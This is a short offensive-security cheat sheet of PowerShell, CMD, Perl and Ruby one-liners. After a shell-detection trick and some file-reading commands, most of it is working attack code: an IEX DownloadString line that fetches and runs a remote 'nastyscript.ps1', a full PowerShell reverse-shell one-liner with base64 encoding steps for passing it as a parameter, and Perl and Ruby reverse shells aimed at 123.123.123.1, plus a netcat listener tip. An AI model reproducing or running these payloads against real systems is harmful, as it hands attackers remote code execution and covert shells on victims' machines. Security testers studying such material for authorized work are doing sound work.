##Check if CMD or Powershell (by PetSerA)
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

----

##Show file content
type file.txt
more file.txt
Get-Content file.txt

----

#Download a file
IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")

----

##Reverse shell
$Oneliner = '$tcp_client=New-Object System.Net.Sockets.TCPClient("123.123.123.1",1234);$client_stream=$tcp_client.GetStream();[byte[]]$stream_bytes=0..65535|%{0};while(($i=$client_stream.Read($stream_bytes,0,$stream_bytes.Length)) -ne 0){;$stream_data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($stream_bytes,0,$i);$response=(iex $stream_data 2>&1 | Out-String );$response2=$response+"PS "+(pwd).Path + "> ";$response_byte=([text.encoding]::ASCII).GetBytes($response2);$client_stream.Write($response_byte,0,$response_byte.Length);$client_stream.Flush()};$tcp_client.Close()'

#Encoded to bytes if needed
$ToBytes = [System.Text.Encoding]::Unicode.GetBytes($Oneliner)

#Encoded to base64 if needed as a parameter etc.
$Base64Enc =[Convert]::ToBase64String($ToBytes)

#Thanks to UB3RSEC
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#You can listen for connections on nc -lnvp 1234 for example
